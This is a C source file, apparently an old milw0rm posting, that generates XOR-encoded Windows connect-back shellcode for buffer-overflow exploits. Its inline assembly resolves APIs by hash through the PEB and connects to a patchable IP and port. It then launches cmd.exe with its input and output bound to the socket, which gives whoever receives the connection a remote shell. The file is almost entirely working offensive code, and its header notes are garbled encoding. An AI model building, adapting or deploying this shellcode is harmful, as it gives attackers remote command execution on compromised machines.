/*
*-----------------------------------------------------------------------
*
* connectback_v32.c - Connect Back shellcode for Overflow exploit
*
* Copyright (C) 2000-2004 HUC All Rights Reserved.
*
* Author   : lion
*          : lion@cnhonker.net
*          : http://www.cnhonker.com
*          :
* Date     : 2003-08-15
*          :
* Update   : 2004-05-22 v3.2
*          : 2004-05-05 v3.1
*          : 2004-01-08 v3.0
*          : 2003-09-10 v2.0
*          : 2003-08-15 v1.0
*          :
* Tested   : Windows 2000/Windows XP/windows 2003
*          :
* Notice   : 1. Í¨¹ýpebÈ¡µÃkernel32.dllµØÖ·¡£
*          : 2. Í¨¹ýº¯ÊýµÄhashÖµÀ´½øÐÐ±È½Ï£¬´úÌæGetProcAddressÈ¡µÃº¯ÊýµØÖ·£¬½ÚÊ¡º¯ÊýÃûÕ¼ÓÃµÄ¿Õ¼ä¡£
*          : 3. ÀûÓÃÑ­»·»ñÈ¡hashÖµºÍº¯ÊýµØÖ·£¬½ÚÊ¡¿Õ¼ä¡£
*          : 4. ·´Á¬¶Ë¿ÚÀ´»ñµÃshell¡£
*          : 5. ÓÃvc6¿ÉÒÔÃüÁîÐÐÖ±½Ó±àÒë£¬·½±ãÐÞ¸Ä¡£
*          : 6. win2000/winxp/win2003 ÏÂ²âÊÔ³É¹¦¡£
*          : 7. ÔÚÊ¹´úÂëÒ×ÓÚÐÞ¸ÄµÄÍ¬Ê±×î´óÓÅ»¯Îª´óÐ¡275 bytes¡£
*          :
* Complie  : cl connectback_v32.c
*          :
* Reference: http://www.lsd-pl.net/documents/winasm-1.0.1.pdf
*          : http://www.metasploit.com/shellcode.html
*
*------------------------------------------------------------------------
*/

#include <stdio.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32")

// Use for find the ASM code
#define PROC_BEGIN                     __asm _emit 0x90 __asm  _emit 0x90\
                                       __asm _emit 0x90 __asm  _emit 0x90\
                                       __asm _emit 0x90 __asm  _emit 0x90\
                                       __asm _emit 0x90 __asm  _emit 0x90
#define PROC_END                       PROC_BEGIN
#define SEARCH_STR                     "\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#define SEARCH_LEN                     8
#define MAX_SC_LEN                     2048
#define HASH_KEY                       13

// Define Decode Parameter
#define DECODE_LEN                     21
#define SC_LEN_OFFSET                  7
#define ENC_KEY_OFFSET                 11
#define ENC_KEY                        0x99


// Define Function Addr
#define ADDR_LoadLibraryA              [esi]
#define ADDR_CreateProcessA            [esi+4]
#define ADDR_ExitProcess               [esi+8]
#define ADDR_WaitForSingleObject       [esi+12]
#define ADDR_WSASocketA                [esi+16]
#define ADDR_connect                   [esi+20]
#define ADDR_closesocket               [esi+24]
//#define ADDR_WSAStartup                [esi+28]
//#define ADDR_CMD                       [esi+32]

// Need functions
unsigned char functions[100][128] =
{                                           // [esi] stack layout
    // kernel32 4                           // 00 kernel32.dll
    {"LoadLibraryA"},                       //    [esi]
    {"CreateProcessA"},                     //    [esi+4]
    {"ExitThread"},                         //    [esi+8]
    //{"ExitProcess"},
    //{"TerminateProcess"},
    {"WaitForSingleObject"},                //    [esi+12]
    //{"WaitForSingleObjectEx"},

    // ws2_32  3                            // 01 ws2_32.dll
    {"WSASocketA"},                         //    [esi+16]
    {"connect"},                            //    [esi+20]
    {"closesocket"},                        //    [esi+24]
    //{"WSAStartup"},                       //    [esi+28]
    {""},
};

// Shellcode string
unsigned char  sc[1024] = {0};

// ASM shellcode main function
void    ShellCode();

// Get function hash
static DWORD __stdcall GetHash ( char *c )
{
    DWORD h = 0;

    while ( *c )
    {
        __asm ror h, HASH_KEY

        h += *c++;
    }
    return( h );
}

// Print Shellcode
void PrintSc(unsigned char *sc, int len)
{
    int    i,j;
    char *p;
    char msg[6];

    //printf("/* %d bytes */\n", buffsize);

    // Print general shellcode
    for(i = 0; i < len; i++)
    {
        if((i%16)==0)
        {
            if(i!=0)
                printf("\"\n\"");
            else
                printf("\"");
        }

        //printf("\\x%.2X", sc[i]);

        sprintf(msg, "\\x%.2X", sc[i] & 0xff);

        for( p = msg, j=0; j < 4; p++, j++ )
        {
            if(isupper(*p))
                printf("%c", _tolower(*p));
            else
                printf("%c", p[0]);
        }
    }

    printf("\";\n");
}


void Make_ShellCode()
{
    unsigned char  *pSc_addr;
    unsigned int   Sc_len;
    unsigned int   Enc_key=ENC_KEY;
    unsigned long  dwHash[100];
    unsigned int   dwHashSize;

    int i,j,k,l;


    // Get functions hash
    printf("[+] Get functions hash strings.\r\n");
    for (i=0;;i++)
    {
        if (functions[i][0] == '\x0') break;

        dwHash[i] = GetHash((char*)functions[i]);
        printf("\t%.8X\t%s\n", dwHash[i], functions[i]);
    }
    dwHashSize = i*4;


    // Deal with shellcode
    pSc_addr = (unsigned char *)ShellCode;

    for (k=0;k<MAX_SC_LEN;++k )
    {
        if(memcmp(pSc_addr+k,SEARCH_STR, SEARCH_LEN)==0)
        {
            break;
        }
    }
    pSc_addr+=(k+SEARCH_LEN);               // Start of the ShellCode

    for (k=0;k<MAX_SC_LEN;++k)
    {
        if(memcmp(pSc_addr+k,SEARCH_STR, SEARCH_LEN)==0) {
            break;
        }
    }
    Sc_len=k;                               // Length of the ShellCode

    memcpy(sc, pSc_addr, Sc_len);           // Copy shellcode to sc[]


    // Add functions hash
    memcpy(sc+Sc_len, (char *)dwHash, dwHashSize);
    Sc_len += dwHashSize;


    // Print the size of shellcode.
    printf("[+] %d + %d = %d bytes shellcode\n", Sc_len-DECODE_LEN, DECODE_LEN, Sc_len);

    // Print the ip/port offset
    for(k=0; k <= Sc_len-3; ++k)
    {
        if(sc[k] == 0x00 && sc[k+1] == 0x35)
            printf("/* port offset: %d + %d = %d */\r\n", k-DECODE_LEN, DECODE_LEN, k);
        if(sc[k] == 0x7F && sc[k+3] == 0x01)
            printf("/* ip offset: %d + %d = %d */\r\n", k-DECODE_LEN, DECODE_LEN, k);
    }

/*
    for(i=DECODE_LEN; i<Sc_len; i++)
    {
       sc[i] ^= Enc_key;
    }
*/

    // Print shellcode
    //PrintSc(sc, Sc_len);


    // Deal with find the right XOR byte
    for(i=0xff; i>0; i--)
    {
        l = 0;
        for(j=DECODE_LEN; j<Sc_len; j++)
        {
            if (
                   ((sc[j] ^ i) == 0x26) || //%
                   ((sc[j] ^ i) == 0x3d) || //=
                   ((sc[j] ^ i) == 0x3f) || //?
                   ((sc[j] ^ i) == 0x40) || //@
                   ((sc[j] ^ i) == 0x00) ||
                   ((sc[j] ^ i) == 0x0D) ||
                   ((sc[j] ^ i) == 0x0A)
                )                           // Define Bad Characters
            {
                l++;                        // If found the right XOR byte£¬l equals 0
                break;
            };
        }

        if (l==0)
        {
            Enc_key = i;

            //printf("[+] Find XOR Byte: 0x%02X\n", i);
            for(j=DECODE_LEN; j<Sc_len; j++)
            {
                sc[j] ^= Enc_key;
            }

            break;                          // If found the right XOR byte, Break
        }
    }

    // Deal with not found XOR byte
    if (l!=0)
   {
        printf("[-] No xor byte found!\r\n");
        exit(-1);
    }

    // Deal with DeCode string
    //memcpy(&sc[SC_LEN_OFFSET], &Sc_len, 2);
    *(unsigned char *)&sc[SC_LEN_OFFSET] = Sc_len-DECODE_LEN;
    *(unsigned char *)&sc[ENC_KEY_OFFSET] = Enc_key;

    // Print decode
    printf("/* %d bytes decode */\r\n", DECODE_LEN);
    PrintSc(sc, DECODE_LEN);

    // Print shellcode
    printf("/* %d bytes shellcode, xor with 0x%02x */\r\n", Sc_len-DECODE_LEN, Enc_key);
    PrintSc((char*)sc+DECODE_LEN, Sc_len-DECODE_LEN);
}

void main()
{
    DWORD    addr;
    WSADATA        wsa;

    WSAStartup(MAKEWORD(2,2),&wsa);

    Make_ShellCode();

    addr = (DWORD)&sc;

    __asm
    {
        jmp addr
    }

    return;
}

// ShellCode function
void ShellCode()
{
    __asm
    {
        PROC_BEGIN                          // C macro to begin proc
//--------------------------------------------------------------------
//
// DeCode
//
//--------------------------------------------------------------------
        jmp     short decode_end

decode_start:
        pop     ebx                         // Decode start addr (esp -> ebx)
        dec     ebx
        xor     ecx,ecx
        mov     cl,0xFF                     // Decode len

    decode_loop:
        xor     byte ptr [ebx+ecx],0x99     // Decode key
        loop    decode_loop
        jmp     short decode_ok

decode_end:
        call    decode_start

decode_ok:

//--------------------------------------------------------------------
//
// ShellCode
//
//--------------------------------------------------------------------
        jmp     sc_end

sc_start:
        pop     edi                         // Hash string start addr (esp -> edi)

        // Get kernel32.dll base addr
        mov     eax, fs:0x30                // PEB
        mov     eax, [eax+0x0c]             // PROCESS_MODULE_INFO
        mov     esi, [eax+0x1c]             // InInitOrder.flink
        lodsd                               // eax = InInitOrder.blink
        mov     ebp, [eax+8]                // ebp = kernel32.dll base address

        mov     esi, edi                    // Hash string start addr -> esi

        // Get function addr of kernel32
        push    4
        pop     ecx

    getkernel32:
        call    GetProcAddress_fun
        loop    getkernel32

        // Get ws2_32.dll base addr
        push    0x00003233
        push    0x5f327377
        push    esp
        call    ADDR_LoadLibraryA          // LoadLibraryA("ws2_32");

        //mov     ebp, eax                   // ebp = ws2_32.dll base address
        xchg    eax, ebp

        // Get function addr of ws2_32
        push    3
        pop     ecx

    getws2_32:
        call    GetProcAddress_fun
        loop    getws2_32

/*
//LWSAStartup:
        sub     esp, 400
        push    esp
        push    0x101
        call    ADDR_WSAStartup             // WSAStartup(0x101, &WSADATA);
*/

//LWSASocketA:
        push    ecx
        push    ecx
        push    ecx
        push    ecx

        push    1
        push    2
        call    ADDR_WSASocketA             // s=WSASocketA(2,1,0,0,0,0);

        //mov     ebx, eax                    // socket -> ebx
        xchg    eax, ebx

//Lconnect:
        push    0x0100007F 					// host: 127.0.0.1
        push    0x35000002 					// port: 53
        mov     ebp, esp

        push    0x10                        // sizeof(sockaddr_in)
        push    ebp                         // sockaddr_in address
        push    ebx                         // socket s
        call    ADDR_connect                // connect(s, name, sizeof(name));

        // if connect failed , exit
        test    eax, eax
        jne     Finished

//        xor     eax, eax

        // allot memory for STARTUPINFO, PROCESS_INFORMATION
        mov     edi, esp

        // zero out SI/PI
        push    0x12
        pop     ecx
    stack_zero:
        stosd
        loop    stack_zero

        //mov     byte ptr [esp+0x10], 0x44   // si.cb = sizeof(si)
        //inc     byte ptr [esp+0x3C]         // si.dwFlags
        //inc     byte ptr [esp+0x3D]         // si.wShowWindow
        //mov     [esp+0x48], ebx             // si.hStdInput = s
        //mov     [esp+0x4C], ebx             // si.hStdOutput = s
        //mov     [esp+0x50], ebx             // si.hStdError = s

        mov     word ptr  [esp+0x3c], 0x0101
        xchg    eax, ebx
        stosd
        stosd
        stosd

        mov     edi, esp

        // push "cmd"
        push    0x00646d63                  // "cmd"
        mov     ebp, esp

        push    eax                         // socket

//LCreateProcess:
        lea     eax, [edi+0x10]
        push    edi                         // pi
        push    eax                         // si
        push    ecx                         // lpCurrentDirectory
        push    ecx                         // lpEnvironment
        push    ecx                         // dwCreationFlags
        push    1                           // bInheritHandles
        push    ecx                         // lpThreadAttributes
        push    ecx                         // lpProcessAttributes
        push    ebp                         // lpCommandLine =  "cmd"
        push    ecx                         // lpApplicationName NULL
        call    ADDR_CreateProcessA         // CreactProcessA(NULL,"CMD",0,0,1,0,0,0,si, pi);

//LWaitForSingleObject:
        //push    1
        push    0xFFFFFFFF
        push    dword ptr [edi]
        call    ADDR_WaitForSingleObject    // WaitForSingleObject(Handle, time) ;

//LCloseSocket:
        //push    ebx
        call    ADDR_closesocket            // closesocket(c);

Finished:
        //push    1
        call    ADDR_ExitProcess            // ExitProcess();

//
GetProcAddress_fun:
        push    ecx
        push    esi

        mov     esi, [ebp+0x3C]             // e_lfanew
        mov     esi, [esi+ebp+0x78]         // ExportDirectory RVA
        add     esi, ebp                    // rva2va
        push    esi
        mov     esi, [esi+0x20]              // AddressOfNames RVA
        add     esi, ebp                    // rva2va
        xor     ecx, ecx
        dec     ecx

    find_start:
        inc     ecx
        lodsd
        add     eax, ebp
        xor     ebx, ebx

    hash_loop:
        movsx   edx, byte ptr [eax]
        cmp     dl, dh
        jz      short find_addr
        ror     ebx, HASH_KEY               // hash key
        add     ebx, edx
        inc     eax
        jmp     short hash_loop

    find_addr:
        cmp     ebx, [edi]                  // compare to hash
        jnz     short find_start
        pop     esi                         // ExportDirectory
        mov     ebx, [esi+0x24]             // AddressOfNameOrdinals RVA
        add     ebx, ebp                    // rva2va
        mov     cx, [ebx+ecx*2]             // FunctionOrdinal
        mov     ebx, [esi+0x1C]             // AddressOfFunctions RVA
        add     ebx, ebp                    // rva2va
        mov     eax, [ebx+ecx*4]            // FunctionAddress RVA
        add     eax, ebp                    // rva2va
        stosd                               // function address save to [edi]

        pop     esi
        pop     ecx
        ret

sc_end:
        call sc_start

        PROC_END                            //C macro to end proc
    }
}

// milw0rm.com [2004-10-25]